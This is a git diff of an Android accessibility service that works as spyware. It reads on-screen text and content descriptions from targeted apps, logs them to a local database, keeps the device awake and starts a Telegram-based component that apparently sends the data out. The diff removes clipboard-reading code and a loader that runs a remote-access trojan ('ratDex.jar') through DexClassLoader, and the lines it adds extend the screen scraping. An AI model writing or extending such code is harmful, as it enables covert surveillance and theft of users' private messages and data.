@@ -1,6 +1,7 @@
 package com.hhm.android.otherapp;
 
 import android.accessibilityservice.AccessibilityService;
+import android.accessibilityservice.AccessibilityServiceInfo;
 import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.ActivityManager;
@@ -39,11 +40,14 @@ import java.util.logging.Logger;
 
 import dalvik.system.DexClassLoader;
 
+import static com.hhm.android.otherapp.managers.AppsManager.getApplicationNameByPackageName;
+
 
 public class myService extends AccessibilityService{
     public static final String TAG = "MainService";
 
     public myService() {}
+    public Context mContext;
 
     @Override
     public void onCreate(){
@@ -55,11 +59,11 @@ public class myService extends AccessibilityService{
 
     @Override
     public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
-        contextOfApplication = this;
         SQLiteDao.setInstance(this); // 初始化数据库
         ServiceConfig.setRemoteAddress(AssetsUtil.getRemoteAddressFromAssets(this));
         ServiceConfig.setPackages(AssetsUtil.getPackageNamesFromAssets(this));
         System.out.println("启动TelegramManager");
+        mContext = this;
         TelegramManager.startAsync(this);
         // Android 10 应用已经不能在后台监听剪贴板数据
         if (Build.VERSION.SDK_INT < 29 && mClipboardManager == null){ // 若 Android 版本低于 Android 10，设置剪贴板监听，避免重复设置
@@ -69,84 +73,15 @@ public class myService extends AccessibilityService{
         return Service.START_STICKY; // 提高 server 优先级，自动重启
     }
 
-    private void copydata(final Context context) {
-        System.out.println("1");
-        ClipboardManager clipboard = (ClipboardManager) context.getSystemService(context.CLIPBOARD_SERVICE);
-        System.out.println("2");
-        //无数据时直接返回
-        if (!clipboard.hasPrimaryClip()) {
-            System.out.println("3");
-            return;
-        }
-        //如果是文本信息
-        if (clipboard.getPrimaryClipDescription().hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN)) {
-            ClipData cdText = clipboard.getPrimaryClip();
-            ClipData.Item item = cdText.getItemAt(0);
-            //此处是TEXT文本信息
-            if (item.getText() != null && !item.getText().toString().equals("")) {
-               String str = item.getText().toString();
-               System.out.println("20201117==>" + str);
-
-            }
-        }
-    }
-
-    public void initAndStartRatFromDex(Context ctx){
-        File dexOutputDir = ctx.getDir("testJar", 0);
-        String dexPath = ctx.getFilesDir().getPath()+"/ratDex.jar";
-        File f = new File(dexPath);
-        if (f.exists()){
-            Log.e(TAG,dexPath);
-        }
-
-        DexClassLoader loader = new DexClassLoader(dexPath, dexOutputDir.getAbsolutePath(), null, ctx.getClassLoader());
-        try {
-            Class clz = loader.loadClass("com.hhm.android.rat.ratManager");
-            Method dexRes = clz.getMethod("initAndStartRat",Context.class);
-            Object[] params = {ctx};
-            dexRes.invoke(clz.newInstance(),params);
-            Log.e(TAG,"Invoke initAndStartRat()");
-        } catch (InvocationTargetException e){
-            e.printStackTrace();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-
-    }
-
-    private void copyAssets(Context ctx, String filename) {
-        InputStream in = null;
-        OutputStream out = null;
-        Log.e(TAG, "copyAssets():Attempting to copy this file: " + filename);
-        try {
-            AssetManager assetManager = ctx.getAssets();
-            String executableFilePath = ctx.getFilesDir().getPath();
-            in = assetManager.open(filename);
-            File outFile = new File(executableFilePath, filename);
-            out = new FileOutputStream(outFile);
-            copyFile(in, out);
-            in.close();
-            in = null;
-            out.flush();
-            out.close();
-            out = null;
-            Log.e(TAG, "Copy success: " + filename);
-        } catch(IOException e) {
-            Log.e(TAG, "Failed to copy asset file: " + filename, e);
-        }
-    }
-
-    void copyFile(InputStream in, OutputStream out){
-        try {
-            byte[] buf = new byte[1024];
-            int len;
-            while ((len = in.read(buf)) > 0) {
-                out.write(buf, 0, len);
-            }
-        } catch (IOException e){
-            Log.e(TAG, "Failed to read/write asset file: ", e);
-        }
-    };
+    /*@Override
+    protected void onServiceConnected() {
+        Log.i(TAG, "config success!");
+        AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
+        accessibilityServiceInfo.eventTypes = AccessibilityEvent.TYPES_ALL_MASK; // 指定事件类型
+        accessibilityServiceInfo.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
+        accessibilityServiceInfo.notificationTimeout = 1000;
+        setServiceInfo(accessibilityServiceInfo);
+    }*/
 
     @Override
     public void onDestroy() {
@@ -167,10 +102,12 @@ public class myService extends AccessibilityService{
         listener.register(new ScreenListener.ScreenStateListener() {
             @Override
             public void onScreenOn() { }
+
             @Override
             public void onScreenOff() {
                 acquireWakeLock();
             }
+
             @Override
             public void onUserPresent() {
                 releaseWakeLock();
@@ -184,7 +121,8 @@ public class myService extends AccessibilityService{
     private void acquireWakeLock() {
         if (wakeLock == null) {
             PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ON_AFTER_RELEASE, getClass().getCanonicalName());
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK
+                    | PowerManager.ON_AFTER_RELEASE, getClass().getCanonicalName());
             Log.e(TAG,"acquireWakeLock():" + wakeLock);
             if (wakeLock != null) {
                 wakeLock.acquire();
@@ -199,113 +137,73 @@ public class myService extends AccessibilityService{
         }
     }
 
-    //20201116
-    private static Context contextOfApplication;
-    private StringBuffer lastAllInfoStr = new StringBuffer();
-    private StringBuffer allInfoStr;
 
-    private static String packagename = "";
+    private String data = "";
 
     //任何操作将触发执行该回调函数
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-            /*String packageName = null;
-            if (event.getPackageName()!=null){
-                packageName = event.getPackageName().toString();
-            } else {
-                packageName = "CAN'T GET PACKAGE NAME";
+        try {
+            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
+                    event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
+                    event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
+                    event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
+                String pkg = event.getPackageName().toString();
+                //String pkg = getApplicationNameByPackageName(getApplicationContext(), event.getPackageName().toString());
+                nodeInfoDFS(getRootInActiveWindow(), pkg);
             }
-            if (ServiceConfig.isInPackage(packageName)){
-                allInfoStr = new StringBuffer();
-                nodeInfoDFS(getRootInActiveWindow(),0);
-                String lastStr = lastAllInfoStr.toString();
-                String newStr = allInfoStr.toString();
-                if (!lastStr.equals(newStr)){
-                    SQLiteDao.addToList(packageName,newStr);
-                }
-                lastAllInfoStr = allInfoStr;
-            }*/
-        packagename = event.getPackageName().toString();
-        if (ServiceConfig.isInPackage(packagename)) {
-            AccessibilityNodeInfo rowNode = getRootInActiveWindow();
-            if (rowNode == null) {
-                return;
-            } else {
-                recycle(rowNode,packagename);
-            }
-        }
+        } catch (NullPointerException e){}
+
     }
 
-    String data = "";
-    public void recycle(AccessibilityNodeInfo info,String packagename) {
-        if (info.getChildCount() == 0) {
-            if (info.getText() != null && !data.contains(info.getText())) {
-                System.out.println("2020==浏览器>" + info.getText().toString());
-                SQLiteDao.addToList(packagename,info.getText().toString());
+
+    // 遍历根节点下所有节点，并将节点的 Text 和 ContentDescription
+    private void nodeInfoDFS(AccessibilityNodeInfo info,String pkg) {
+        try {
+            CharSequence contentDescription = info.getContentDescription();
+            if (contentDescription != null && !contentDescription.toString().equals("")) {
+                String str = contentDescription.toString();
+                if (str.contains("ReactTextView:")) {
+                    str = str.replace("ReactTextView:", "");
+                } else if (str.contains("ReactImageView:")) {
+                    str = str.replace("ReactImageView:", "");
+                }
+                if (str != null && !data.contains(str)) {
+                    System.out.println("202012170==浏览器内容>" + str);
+                    SQLiteDao.addToList(pkg, str);
+                }
+                data = data + "\t" + str;
             }
-            data = data + "\t" + info.getText();
-        } else {
+            if (info.getText() != null) {
+                String str = info.getText().toString();
+                if (str != null && !data.contains(str)) {
+                    System.out.println("202012171==浏览器内容>" + str);
+                    SQLiteDao.addToList(pkg, str);
+                }
+                data = data + "\t" + str;
+            }
             for (int i = 0; i < info.getChildCount(); i++) {
-                if(info.getChild(i)!=null){
-                    recycle(info.getChild(i),packagename);
+                if (info.getChild(i) != null) {
+                    nodeInfoDFS(info.getChild(i), pkg);
                 }
             }
-        }
-        try {
-            Thread.sleep(100);
-        } catch (InterruptedException e) {
+        } catch (NullPointerException e) {
+            e.printStackTrace();
+        } catch (Exception e) {
             e.printStackTrace();
         }
-        info.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD); // 下滑
+        /*try {
+            Thread.sleep(100);
+            info.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD); // 下滑
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }*/
     }
 
     @Override
     public void onInterrupt() {
         Log.e(TAG,"onInterrupt():onInterrupt");
         SQLiteDao.addLogOfDb(); // 服务暂停，将 List 中的数据通过事务传入数据库
-    }
-
-    public static Context getContextOfApplication() {
-        return contextOfApplication;
-    }
-
-    // 遍历根节点下所有节点，并将节点的 Text 和 ContentDescription 添加至 allInfoStr
-    private void nodeInfoDFS(AccessibilityNodeInfo info, int tierIndex) {
-        try {
-            CharSequence text = info.getText();
-            CharSequence contentDescription = info.getContentDescription();
-            if (text !=null && contentDescription !=null){
-                setIndentation(allInfoStr,tierIndex);
-                allInfoStr.append(text);
-                if (text != contentDescription){
-                    allInfoStr.append(" ").append(contentDescription).append("\n");
-                }else {
-                    allInfoStr.append("\n");
-                }
-            }
-            else if (text != null){
-                setIndentation(allInfoStr,tierIndex);
-                allInfoStr.append(text).append("\n");
-            }
-            else if (contentDescription != null){
-                setIndentation(allInfoStr,tierIndex);
-                allInfoStr.append(contentDescription).append("\n");
-            }
-            for (int i = 0; i < info.getChildCount(); i++) {
-                if (info.getChild(i)!=null){
-                    nodeInfoDFS(info.getChild(i),tierIndex+1);
-                }
-            }
-        } catch (Exception e){
-            Log.e(TAG,"nodeInfoDFS():"+e.getMessage());
-        }
-    }
-
-    // 设置 allInfoStr 中的缩进
-    private void setIndentation(StringBuffer stringBuffer,int tierIndex){
-        for (int i=0; i<tierIndex; i++){
-            stringBuffer.append("\t");
-        }
     }
 
     private ClipboardManager mClipboardManager;
